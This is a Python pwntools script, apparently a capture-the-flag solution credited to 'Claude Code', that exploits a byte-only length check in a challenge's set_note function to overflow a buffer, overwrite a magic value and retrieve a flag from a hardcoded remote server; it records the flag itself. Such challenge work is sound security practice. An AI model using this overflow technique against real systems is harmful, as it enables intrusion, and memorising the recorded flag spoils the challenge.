#!/usr/bin/env python3
"""
Author: Claude Code
Purpose: Exploit buffer overflow in Count the Cost challenge
Created: 2025-11-10
Updated: 2025-11-10

Vulnerability:
The set_note function has a byte-only length check (cmp bl, 0x40) but uses
the full uint16 value for malloc/read. By sending length 0x0240, we bypass
the check (0x40 <= 0x40) but can write 576 bytes to overflow and overwrite
the magic value at offset 0x220.

Expected result: Flag from remote server
Produced result: poctf{uwsp_0u7574nd1n6_1n_7h31r_f13ld}
"""

from pwn import *

# Configuration
HOST = "34.9.14.80"
PORT = 14992

def exploit(target):
    """
    Exploit the buffer overflow vulnerability to set the magic value
    and retrieve the flag.
    """
    # Receive the banner
    target.recvuntil(b"Track a few transactions and check out.")
    target.recvuntil(b"> ")

    # Step 1: Select option 2 (set_note)
    log.info("Selecting set_note option...")
    target.sendline(b"2")

    # Step 2: Select transaction index 0
    target.recvuntil(b"index (0-7): ")
    log.info("Selecting transaction index 0...")
    target.sendline(b"0")

    # Step 3: Send malicious length 0x0240 (576 bytes)
    # This bypasses the check because only the low byte (0x40) is compared
    target.recvuntil(b"len (uint16): ")
    log.info("Sending malicious length 0x0240 (576 bytes)...")

    # Send the 2-byte length in little-endian format
    malicious_length = p16(0x0240)  # 576 bytes
    target.send(malicious_length)

    # Step 4: Send payload to overwrite magic value
    # Magic is at offset 0x220 (544 bytes) from the start of transaction 0
    magic_value = 0xc0dec0dec0dec0de
    payload = b'A' * 544  # Padding to reach magic offset
    payload += p64(magic_value)  # Overwrite magic value
    payload += b'B' * (576 - len(payload))  # Fill remaining bytes

    log.info(f"Sending payload of {len(payload)} bytes...")
    target.send(payload)

    # Confirm note was set
    target.recvuntil(b"note set")
    log.success("Note set successfully!")

    # Step 5: Trigger checkout to get the flag
    target.recvuntil(b"> ")
    log.info("Calling checkout to retrieve flag...")
    target.sendline(b"3")

    # Receive and display the flag
    response = target.recvall(timeout=2)
    log.success("Response received:")
    print(response.decode())

    return response

if __name__ == "__main__":
    # Connect to remote target
    log.info(f"Connecting to {HOST}:{PORT}...")
    target = remote(HOST, PORT)

    try:
        result = exploit(target)

        # Check if we got the flag
        if b"flag{" in result or b"FLAG{" in result or b"manager override accepted" in result:
            log.success("Exploit successful! Flag retrieved!")
        else:
            log.warning("Exploit may not have worked as expected")

    except Exception as e:
        log.error(f"Exploit failed: {e}")
        import traceback
        traceback.print_exc()

    finally:
        target.close()
